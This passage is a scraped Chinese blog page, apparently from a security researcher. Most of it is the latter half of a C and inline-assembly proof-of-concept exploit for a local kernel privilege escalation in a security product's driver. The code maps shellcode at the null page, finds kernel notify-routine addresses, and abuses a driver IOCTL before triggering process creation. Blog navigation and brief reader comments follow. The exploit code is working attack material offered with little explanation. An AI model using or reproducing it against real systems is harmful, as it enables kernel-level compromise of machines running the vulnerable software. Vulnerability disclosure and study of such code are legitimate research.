+&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;  lea eax , BaseAddress<br>
+&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;  push 0xffffffff<br>
+&nbsp;&nbsp;  call pNtAllocateVirtualMemory<br>
+&nbsp;&nbsp;  mov status , eax<br>
+}</p>
+<p>if (status != 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;allocate 0 memory failed %08x\n&quot; , status);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}<br>
+//set nop code<br>
+ULONG codesize = (ULONG)nopfunc - (ULONG)ShellCode;</p>
+<p>memset((PVOID)0 , 0x90 , 0x8);<br>
+memcpy((PVOID)0x8 , ShellCode , codesize);<br>
+ULONG i ; <br>
+for (i = 0x8 ; i &lt; codesize+0x8 ; i++)<br>
+{<br>
+&nbsp;&nbsp;  if (*(DWORD*)i == 0xAAAA5555)<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  *(DWORD*)i = (DWORD)(GetModuleHandle(&quot;ntdll.dll&quot;) + 0x2);<br>
+&nbsp;&nbsp;&nbsp;  break ; <br>
+&nbsp;&nbsp;  }<br>
+}<br>
+<br>
+PSYSTEM_MODULE_INFORMATION pModInfo = (PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);</p>
+<p>if (pModInfo == 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;get info table failed!\n&quot;);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p>ULONG Tid ;</p>
+<p>HANDLE hThread = CreateThread(0 , 0 , LegoThread , 0 , 0 , &amp;Tid);<br>
+if (hThread == 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;cannot open thread %u\n&quot;,GetLastError());<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}<br>
+//SystemHandleInformation=16<br>
+PSYSTEM_HANDLE_INFORMATION pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(16);<br>
+if (pHandleInfo == 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;cannot get handle info\n&quot;);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+} <br>
+ULONG ThreadObject =0;</p>
+<p>for (i = 0 ; i &lt; pHandleInfo-&gt;NumberOfHandles ; i ++)<br>
+{<br>
+&nbsp;&nbsp;  if (pHandleInfo-&gt;Information[i].UniqueProcessId == GetCurrentProcessId() &amp;&amp;<br>
+&nbsp;&nbsp;&nbsp;  pHandleInfo-&gt;Information[i].HandleValue == (USHORT)hThread)<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  ThreadObject = (ULONG)pHandleInfo-&gt;Information[i].Object;<br>
+&nbsp;&nbsp;&nbsp;  break ; <br>
+&nbsp;&nbsp;  }<br>
+}<br>
+if (ThreadObject == 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;cannot get thread object!\n&quot;);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}<br>
+ThreadObject+=0xd0;</p>
+<p><br>
+<br>
+HMODULE hkernel = LoadLibraryA(strrchr(pModInfo-&gt;Module[0].ImageName, '\\') + 1);<br>
+if (hkernel == 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;kernel mapping error %u\n&quot; , GetLastError());<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p>ULONG PsSetLegoNotifyRoutine = (ULONG)GetProcAddress(hkernel , &quot;PsSetLegoNotifyRoutine&quot;);<br>
+ULONG PspLegoNotifyRoutine = 0 ;</p>
+<p>if (PsSetLegoNotifyRoutine ==0)<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;PsSetLegoNotifyRoutine==0&quot;);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p>for (i = PsSetLegoNotifyRoutine ; i &lt; PsSetLegoNotifyRoutine + 0x10 ; i ++)<br>
+{<br>
+&nbsp;&nbsp;  if (*(BYTE*)i == 0xa3 &amp;&amp; *(BYTE*)(i + 5 == 0xb8 ) &amp;&amp; *(DWORD*)(i + 6 )==0xd0)<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  PspLegoNotifyRoutine = *(ULONG*)(i +1); <br>
+&nbsp;&nbsp;&nbsp;  break ; <br>
+&nbsp;&nbsp;  }<br>
+}</p>
+<p>if (PspLegoNotifyRoutine == 0 )<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;bad PsSetLegoNotifyRoutine\n&quot;);<br>
+&nbsp;&nbsp;  return 0 ;<br>
+}<br>
+ULONG PsSetCreateProcessNotifyRoutine = (ULONG)GetProcAddress(hkernel , &quot;PsSetCreateProcessNotifyRoutine&quot;);<br>
+ULONG PspCreateProcessNotifyRoutine= 0 ;</p>
+<p>if (PsSetCreateProcessNotifyRoutine==0)<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;PsSetCreateProcessNotifyRoutine==0!\n&quot;);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p>for (i = PsSetCreateProcessNotifyRoutine ; i &lt; PsSetCreateProcessNotifyRoutine + 0x30 ; i ++)<br>
+{<br>
+&nbsp;&nbsp;  if (*(BYTE*)i == 0xbf &amp;&amp; *(WORD*)(i + 5) == 0xe857)<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  PspCreateProcessNotifyRoutine = *(ULONG*)(i + 1);<br>
+&nbsp;&nbsp;&nbsp;  break ; <br>
+&nbsp;&nbsp;  }<br>
+}</p>
+<p>if (PspCreateProcessNotifyRoutine ==0)<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;bad PsSetCreateProcessNotifyRoutine!\n&quot;);<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p>PIMAGE_DOS_HEADER doshdr ; <br>
+PIMAGE_NT_HEADERS nthdr ; <br>
+doshdr = (PIMAGE_DOS_HEADER )(hkernel);<br>
+nthdr = (PIMAGE_NT_HEADERS)((ULONG)hkernel + doshdr-&gt;e_lfanew);</p>
+<p>PspLegoNotifyRoutine += (ULONG)pModInfo-&gt;Module[0].Base - nthdr-&gt;OptionalHeader.ImageBase;<br>
+PspCreateProcessNotifyRoutine += (ULONG)pModInfo-&gt;Module[0].Base - nthdr-&gt;OptionalHeader.ImageBase;<br>
+FreeLibrary(hkernel);<br>
+ULONG PspLegoNotifyRoutineOff = (ULONG)PspLegoNotifyRoutine - (ULONG)pModInfo-&gt;Module[0].Base ; <br>
+ULONG PspCreateProcessNotifyRoutineOff = (ULONG)PspCreateProcessNotifyRoutine - (ULONG)pModInfo-&gt;Module[0].Base;<br>
+ULONG btr ; <br>
+ULONG InputBuffer[3] = {0x0 , PspCreateProcessNotifyRoutineOff , PspLegoNotifyRoutineOff };</p>
+<p>if (!DeviceIoControl(hDev , <br>
+&nbsp;&nbsp;  0x800001A4, <br>
+&nbsp;&nbsp;  &amp;InputBuffer , <br>
+&nbsp;&nbsp;  sizeof(ULONG)*3 , <br>
+&nbsp;&nbsp;  NULL, <br>
+&nbsp;&nbsp;  0,<br>
+&nbsp;&nbsp;  &amp;btr , <br>
+&nbsp;&nbsp;  0))<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;device io control failed %u\n&quot;, GetLastError());<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}<br>
+<br>
+PVOID pNtCreateProcessEx = GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;) , &quot;NtCreateProcessEx&quot;);<br>
+HANDLE hProc ;</p>
+<p>__asm<br>
+{<br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;  push 0<br>
+&nbsp;&nbsp;  push 0<br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;  push 0x1 <br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;  lea eax ,hProc<br>
+&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;  call pNtCreateProcessEx<br>
+}<br>
+ULONG ThreadLegoDataOff = ThreadObject - (ULONG)pModInfo-&gt;Module[0].Base ;</p>
+<p>InputBuffer[2] = ThreadLegoDataOff;<br>
+if (!DeviceIoControl(hDev , <br>
+&nbsp;&nbsp;  0x800001A4, <br>
+&nbsp;&nbsp;  &amp;InputBuffer , <br>
+&nbsp;&nbsp;  sizeof(ULONG)*3 , <br>
+&nbsp;&nbsp;  NULL, <br>
+&nbsp;&nbsp;  0,<br>
+&nbsp;&nbsp;  &amp;btr , <br>
+&nbsp;&nbsp;  0))<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;device io control failed %u\n&quot;, GetLastError());<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}<br>
+<br>
+<br>
+__asm<br>
+{<br>
+&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;&nbsp;  push 0<br>
+&nbsp;&nbsp;&nbsp;  push 0<br>
+&nbsp;&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;&nbsp;  push 0x1 <br>
+&nbsp;&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;&nbsp;  push 0 <br>
+&nbsp;&nbsp;&nbsp;  lea eax ,hProc<br>
+&nbsp;&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;&nbsp;  call pNtCreateProcessEx<br>
+}</p>
+<p><br>
+TerminateThread(hThread , 0 );</p>
+<p>printf(&quot;POC Executed\n&quot;);<br>
+getchar();<br>
+return 0;<br>
+}</p>
+<p> </p>
+<p> </p></div></td></tr></table>
+
+<br>
+
+<div class="opt">
+
+<a href="/mj0011/blog/category/%C4%AC%C8%CF%B7%D6%C0%E0" title="查看该分类中所有文章">类别：默认分类</a>
+
+| <a  href="#" onclick="addToShare(); return false;" target="_blank"><img src="http://img.baidu.com/hi/img/share.gif" border="0" align="absbottom"  /></a>
+
+
+
+
+	
+
+	| <a title="将此文章添加到百度搜藏" href="http://cang.baidu.com/do/add" onClick="return addToFavor();" target="_blank">添加到搜藏</a>
+
+	
+    | <a title="将此文章分享到i贴吧" href="#" onclick="addToiTieba(); return false;"  target="_blank">分享到i贴吧</a>
+
+
+    | 浏览(<span id="result"></span>)
+
+	| <a href="#send">评论</a>&nbsp;(8)
+
+
+
+<script language="javascript">
+
+/*<![CDATA[*/
+
+var pre = [true,'乔老这句话说得太好了', '乔老这句话说得太好了','/mj0011/blog/item/d51413088e5342dd63d98640.html'];
+
+var post = [true,'Windows 2000/XP/2003/Vista Win32k.sys!ImeCanDestroyDefIMEforChild内核拒绝服务漏洞','Windows 2000/XP/2003/Vista Win...', '/mj0011/blog/item/249da3119cd3c072cb80c458.html'];
+
+if(pre[0] || post[0]){
+
+	document.write('<div style="height:5px;line-height:5px;">&nbsp;</div><div id="in_nav">');
+
+	if(pre[0]){
+
+		document.write('上一篇：<a href="' + pre[3] + '" title="' + pre[1] + '">' +  pre[2] + '</a>&nbsp;&nbsp;&nbsp;&nbsp;');
+
+	}
+
+	if(post[0]){
+
+		document.write('下一篇：<a href="' + post[3] + '" title="' + post[1] + '">' +  post[2] + '</a>');
+
+	}
+
+	document.write('</div>');
+
+}
+
+/*]]>*/
+
+</script>
+
+
+
+</div>
+
+
+
+<div class="line">&nbsp;</div>
+
+
+
+
+
+
+
+    
+<style type="text/css">
+
+/*<![CDATA[*/
+
+#in_related_doc a { text-decoration:none; }
+
+/*]]>*/
+
+</style>
+
+<div id="in_related_tmp"></div>
+
+<script language="javascript" type="text/javascript">
+
+/*<![CDATA[*/
+
+function HI_MOD_IN_RELATED_DOC_CALLBACK(arg){
+
+    if(arg.length <= 1) return false;
+
+    var hasMore = arg[0];
+
+    var D=function(A,B){A[A.length]=B;}
+
+    if(arg.length % 2 == 0) D(arg, ["","","",""]);
+
+
+
+    var html = ['<div id="in_related_doc"><div class="tit">相关文章：</div>'];
+
+    D(html, '<table cellpadding="0" cellspacing="3" border="0">');
+
+    for(var i = 1, j = arg.length; i < j; i += 2){
+
+        D(html, '<tr>');
+
+        D(html, '<td width="15px"><a style="font-size:25px" >&#8226;</a></td><td><a href="http://hi.baidu.com/' + arg[i][3] + '/blog/item/' + arg[i][2] + '.html" target="_blank" title="' + arg[i][0] + '">' + arg[i][1] + '</a>');
+
+        D(html, new Array(10).join('\u3000'));
+
+        D(html, '</td>');
+
+        if(arg[i + 1][0] != "")
+
+            D(html, '<td width="15px"><a style="font-size:25px" >&#8226;</a></td><td><a href="http://hi.baidu.com/' + arg[i + 1][3] + '/blog/item/' + arg[i + 1][2] + '.html" target="_blank" title="' + arg[i + 1][0] + '">' + arg[i + 1][1] + '</a></td>');
+
+        else
+
+            D(html, '<td>&nbsp;</td><td>&nbsp;</td>');
+
+        D(html, '</tr>');
+
+    }
+
+    if(hasMore) D(html, '<tr><td colspan="4"><a target="_blank" href="/sys/search?pageno=1&type=7&sort=1&word=%CE%A2%B5%E3%D6%F7%B6%AF%B7%C0%D3%F9%20Mp110013%2Esys%20%26%2360%3B%3D%201%2E3%2E10123%2E0%20%B1%BE%B5%D8%C4%DA%BA%CB%C8%A8%CF%DE%CC%E1%C9%FD%C2%A9%B6%B4&item=8eb590cba79fe0f152664fa4">更多&gt;&gt;</a></td></tr>');
+
+    D(html, '</table></div><div class="line">&nbsp;</div>');
+
+
+
+    var div = document.getElementById('in_related_tmp');
+
+    if(div){
+
+        div.innerHTML = html.join('');
+
+        while(div.firstChild){
+
+            div.parentNode.insertBefore(div.firstChild, div);
+
+        }
+
+        div.parentNode.removeChild(div);
+
+    }
+
+	window.setTimeout("tracker_init('in_related_doc')",100);
+
+}
+
+
+
+if(RelatedDocData == -1){	// not supported xhr
+
+    var script = document.createElement('script');
+
+    script.type = 'text/javascript';
+
+    script.src = '/sys/search?type=8&word=%CE%A2%B5%E3%D6%F7%B6%AF%B7%C0%D3%F9%20Mp110013%2Esys%20%26%2360%3B%3D%201%2E3%2E10123%2E0%20%B1%BE%B5%D8%C4%DA%BA%CB%C8%A8%CF%DE%CC%E1%C9%FD%C2%A9%B6%B4&item=8eb590cba79fe0f152664fa4&t=' + new Date().getTime();
+
+    document.getElementsByTagName('HEAD')[0].appendChild(script);
+
+}else if(RelatedDocData == null){
+
+	GetAndEval = true;
+
+}else{
+
+	eval(RelatedDocData);
+
+}
+
+
+
+/*]]>*/
+
+</script>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="in_reader">
+
+<div class="tit">最近读者：</div>
+
+
+
+<script>
+
+
+
+	var g_spAnnony=true;
+
+
+
+
+
+var g_read=[
+
+
+
+["teamtopkarl","0a407465616d746f706b61726c0101","teamtopkarl"],
+
+
+
+["micropoint","dd53cea2b5e3fe00","微点"],
+
+
+
+["wkewo","332d776b65776f5806","wkewo"],
+
+
+
+["weolar","0c6977656f6c61727600","weolar"],
+
+
+
+["517826104","1eef51513531373832363130340602","QQ517826104"],
+
+
+
+["%5Fachillis","1c545f616368696c6c6973f504","_achillis"],
+
+
+
+["flowercode","13eb466c6f776572436f64655702","FlowerCode"],
+
+
+
+["cvamy11","5a396376616d793131c705","cvamy11"],
+
+
+
+{}
+
+];
+
+g_read.length=g_read.length-1;
+
+
+
+var _rh1="";
+
+var _rh2="";
+
+
+
+function wrreader(){
+
+	_rh1 += '<table width="100%" ><tr>';
+
+	_rh2+='<tr>';
+
+	if(g_spAnnony){
+
+		_rh1+='<td align="center" width="10%" ><img border="0" width="55" height="55" src="http://img.baidu.com/hi/img/portraitn.jpg"></td>';
+
+		_rh2+='<td>&nbsp;</td>';
+
+		if(g_read.length>0){
+
+			_rh1+='<td align="left" width="12%">';
+
+		}else{
+
+			_rh1+='<td align="left" width="100%">';
+
+		}
+
+		_rh1+='<a href="https://passport.baidu.com/?login&tpl=sp&tpl_reg=sp&u='+myref+'" target="_self" onclick="BdUtil.relogin(); return false;">登录</a>后，您就出现在这里。</td>';
+
+		_rh2+='<td>&nbsp;</td>'
+
+	}
+
+	if(g_read.length==0){
+
+		if(!g_spAnnony){
+
+			_rh1+='<td align=left width="100%">最近还没有登录用户看过这篇文章……</td>';
+
+			_rh2+='<td>&nbsp;</td>';
+
+		}
+
+	}else{
+
+		for(i=0,len=g_read.length;i<len;i++){
+
+			_rh1+='<td align="center" valign="bottom" width="10%" class="user"><a href="/'+g_read[i][0]+'" target="_blank" class="ucard" pid='+g_read[i][1]+'><img border="0" src="http://himg.baidu.com/sys/portraitn/item/'+g_read[i][1]+'.jpg"></a></td>';
+
+			_rh2+='<td align="center" valign="top" class="user"><a href="/'+g_read[i][0]+'" target="_blank" class="ucard" pid="'+g_read[i][1]+'">'+g_read[i][2]+'</a></td>';
+
+		}
+
+	}
+
+	_rh1+='<td width="100%"></td></tr>';
+
+	_rh2+='<td></td></tr></table>';
+
+	document.write(_rh1+_rh2);
+
+}
+
+
+
+wrreader();
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+	</div>
+
+
+
+<div class="line">&nbsp;</div>
+
+
+
+
+
+
+
+<script language="JavaScript">
+
+allkey=allkey+"d19b0ad57201ccc451da4bbb_8eb590cba79fe0f152664fa4_";
+
+</script>
+
+
+
+<div id="in_comment">
+
+<a name="comment"></a>
+
+<div class="tit">网友评论：</div>
+
+<script>
+
+function writecmt(type,id,cmtname,cmturl,portraitId){
+
+	var html1="";
+
+	cmturl=cmturl.replace("https://","http://");
+
+	if(type==1){
+
+			html1="<a href='"+cmturl+"' target='_blank' class='ucard' pid="+portraitId+"><img  border='0' src='http://himg.baidu.com/sys/portraitn/item/"+portraitId+".jpg'><br>"+cmtname+"</a>";
+
+	}else{
+
+		if(cmtname=="" || cmtname=="匿名网友"){
+
+			if(cmturl==""){
+
+				html1="<a>匿名网友</a>";
+
+			}else{
+
+				html1="<a href='"+cmturl+"' target='_blank' title='"+cmturl+"'>"+cmtname+"</a>";
+
+			}
+
+		}else{
+
+			if(cmturl==""){
+
+				html1="<div class='f14' style='display:inline'>网友:<a>"+cmtname+"</a></div>";
+
+			}else{
+
+				html1="<div class='f14' style='display:inline'>网友:<a href='"+cmturl+"' target='_blank' title='"+cmturl+"'>"+cmtname+"</a></div>";
+
+			}
+
+		}
+
+	}
+
+	document.write(html1);
+
+}
+
+function filterCmtContent(n){
+
+	if(!BdBrowser.isIE){
+
+		var defaultfilter1='<span style="filter:glow(color=#000000,strength=2);height:0px;color:#000000">';
+
+		var defaultfilter2='<span style="height: 0px; color: rgb(0, 0, 0);">';
+
+		var commentDiv=document.getElementById(n);
+
+		var divs=commentDiv.getElementsByTagName('div');
+
+		var d,tmp;
+
+		for( var i=0,len=divs.length;i<len;i++){
+
+			d=divs[i];
+
+			if(d.getAttribute('name')=='cmtcontent'){
+
+				tmp=d.innerHTML;
+
+				tmp=tmp.replace(/<span style="filter:glow\(color=#([0-9a-z]{3,6}),strength=2\);height:0px;color:#([0-9a-z]{3,6})">/ig,defaultfilter1);
+
+				tmp=tmp.replace('<span style="height: 0px; color: rgb(255, 255, 255);">',defaultfilter2);
+
+				d.innerHTML=tmp;
+
+			}
+
+		}
+
+	}
+
+}
+
+
+
+</script>
+
+
+
+<script type="text/javascript">
+g_cmtorInfo["43a03434363730ea02"] = "44670";
+</script>
+<a name="86812c6d915c39f642169441" rename="44670" repid="43a03434363730ea02"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">1</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script>
+writecmt(1,"86812c6d915c39f642169441","44670","http://hi.baidu.com/44670","43a03434363730ea02");
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-13  21:09
+| <a href="#" onclick='goCmtReply("43a03434363730ea02");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	第一次看提权，学习下
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["bb5777656e676f6e676c696e678c02"] = "wengongling";
+</script>
+<a name="86812c6d914b39f64216944a" rename="wengongling" repid="bb5777656e676f6e676c696e678c02"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">2</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script>
+writecmt(1,"86812c6d914b39f64216944a","wengongling","http://hi.baidu.com/52hmily","bb5777656e676f6e676c696e678c02");
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-13  21:24
+| <a href="#" onclick='goCmtReply("bb5777656e676f6e676c696e678c02");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	沙发没了,又暴微点菊花~
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["00002e0000"] = ".";
+</script>
+<a name="ceb0b8ec33ade82a63d09f58" rename="." repid="00002e0000"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">3</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script language="javascript">
+writecmt(2,"ceb0b8ec33ade82a63d09f58",".","","00002e0000");
+
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-13  21:48
+| <a href="#" onclick='goCmtReply("00002e0000");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	路过
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["0000c2b3d0a1b1f80000"] = "鲁小兵";
+</script>
+<a name="e915cbb4d424a57e8ad4b223" rename="鲁小兵" repid="0000c2b3d0a1b1f80000"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">4</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script language="javascript">
+writecmt(2,"e915cbb4d424a57e8ad4b223","鲁小兵","","0000c2b3d0a1b1f80000");
+
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-13  22:06
+| <a href="#" onclick='goCmtReply("0000c2b3d0a1b1f80000");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	<img src="http://img.baidu.com/hi/jx2/j_0003.gif">
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["404dbdd0ced256d0a37807"] = "叫我V校";
+</script>
+<a name="023b474ea1885a04b2de0529" rename="叫我V校" repid="404dbdd0ced256d0a37807"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">5</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script>
+writecmt(1,"023b474ea1885a04b2de0529","叫我V校","http://hi.baidu.com/叫我v校","404dbdd0ced256d0a37807");
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-13  22:18
+| <a href="#" onclick='goCmtReply("404dbdd0ced256d0a37807");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	继续爆吧。无聊路过~
+<br> 
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["0000c4e4c3fbcdf8d3d10000"] = "匿名网友";
+</script>
+<a name="168504ced1c35934b600c8ea" rename="匿名网友" repid="0000c4e4c3fbcdf8d3d10000"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">6</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script language="javascript">
+writecmt(2,"168504ced1c35934b600c8ea","匿名网友","","0000c4e4c3fbcdf8d3d10000");
+
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-14  04:34
+| <a href="#" onclick='goCmtReply("0000c4e4c3fbcdf8d3d10000");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	在RSS里看标题,就知道是你写的文章
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["4b42b6c0b5f6a1aaa1aab5b6bfcd8008"] = "独钓——刀客";
+</script>
+<a name="0e6faba18379e38647106481" rename="独钓——刀客" repid="4b42b6c0b5f6a1aaa1aab5b6bfcd8008"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">7</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script>
+writecmt(1,"0e6faba18379e38647106481","独钓——刀客","http://hi.baidu.com/dudiaodaoke","4b42b6c0b5f6a1aaa1aab5b6bfcd8008");
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-17  10:18
+| <a href="#" onclick='goCmtReply("4b42b6c0b5f6a1aaa1aab5b6bfcd8008");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	thank
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+<script type="text/javascript">
+g_cmtorInfo["00007a697461780000"] = "zitax";
+</script>
+<a name="e20244fb05b9da1b6d22eba4" rename="zitax" repid="00007a697461780000"></a>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="item" style="table-layout:fixed;word-wrap:break-word;overflow:hidden;";>
+<tr>
+<td valign="top" class="index" width="5%">8</td>
+<td align="center" valign="top" width="10%">
+<div class="user" style="overflow:hidden;">
+
+<script language="javascript">
+writecmt(2,"e20244fb05b9da1b6d22eba4","zitax","","00007a697461780000");
+
+</script>
+
+</div>
+</td>
+<td class="cnt" style="padding-left:20px;"><span class="date">2010-04-21  15:04
+| <a href="#" onclick='goCmtReply("00007a697461780000");return false;'>回复</a>
+
+
+</span><div class="desc" style="overflow:hidden;word-break:normal;"  name='cmtcontent'>
+	为什么blog不去做个操作系统呢？<br><br>
+</div></td></tr>
+
+</table>
+<div class="line">&nbsp;</div>
+
+
+<div id="page"></div>
+
+
+
+</div>
+
+<script>filterCmtContent('in_comment');</script>
+
+
+
+
+
+<div id="in_send">
+
+<a name="send"></a>
+
+<form name="form1" id="popFormSubmit" action="/mj0011/commit" method="post" onSubmit="return checkcmtform()">
+
+<input type="hidden" name="bdstoken" value="1020688a49a8d1759c7bd7fb6e674103">
+
+<input type="hidden" name="ct" value="8">
+
+<input type="hidden" name="cm" value="1">
+
+<input type="hidden" name="spBlogID" value="8eb590cba79fe0f152664fa4">
+
+<input type="hidden" name="spRefURL" id="spRefURL" />
+
+<script>
+
+    document.getElementById("spRefURL").value = window.location.href;
+
+</script>
+
+<div class="tit">发表评论：</div>
+
+<table width="620" border="0" cellspacing="5" cellpadding="0">
+
+<tr>
+
+
+
+<td class="f14">姓　名：</td>
+
+<td><input type="text" name="spBlogCmtor" id="spBlogCmtor" style="width:220px" tabindex="1" onChange="checkname('spBlogCmtor')" maxlength="49" onFocus="hidErr(1);">
+
+<script>
+
+document.write(" &nbsp;&nbsp; <a href='http://hi.baidu.com/st/reg.html' target='_blank'>注册</a>");
+
+document.write(' | <a href="https://passport.baidu.com/?login&tpl=sp&tpl_reg=sp&u='+myref+'" onclick="BdUtil.relogin(); return false;">登录</a>');
+
+
+
+</script>
+
+
+
+<div style="display:none" id="nmerror">*姓名最长为50字节</div></td>
+
+</tr>
+
+
+
+<tr id="1_err" style="display:none">
+
+<td>&nbsp;</td>
+
+<td><div class="error" id="1_err_con"></div></td>
+
+</tr>
+
+
+
+<tr>
+
+<td class="f14">网址或邮箱：</td>
+
+<td><input type="text" name="spBlogCmtURL" id="spBlogCmtURL" style="width:360px" maxlength="128" tabindex="2" onChange="checkeandu('spBlogCmtURL')" onFocus="hidErr(2);"> (选填)</td>
+
+<script>
+
+G("spBlogCmtor").value="";
+
+G("spBlogCmtURL").value="";
+
+</script>
+
+
+
+</tr>
+
+
+
+<tr id="2_err" style="display:none">
+
+<td>&nbsp;</td>
+
+<td><div class="error" id="2_err_con"></div></td>
+
+</tr>
+
+
+
+<tr>
+
+<td valign="top" class="f14" id="reTitle">内　容：</td>
+
+<td><textarea name="spBlogCmtText" id="spBlogCmtText" style="width:520px;height:155px" tabindex="3" onFocus="hidErr(3);" ></textarea>
+
+<script>
+
+	var editor=null;
+
+	try{
+
+		editor=new BdEditor("spBlogCmtText",{width:"100%",height:"155px"});
+
+		editor.onfocus = function(){hidErr(3);}
+
+		editor.render();
+
+	}catch(e){
+
+		var spBlogCmtText = document.getElementById("spBlogCmtText");
+
+		var p = spBlogCmtText.previousSibling;
+
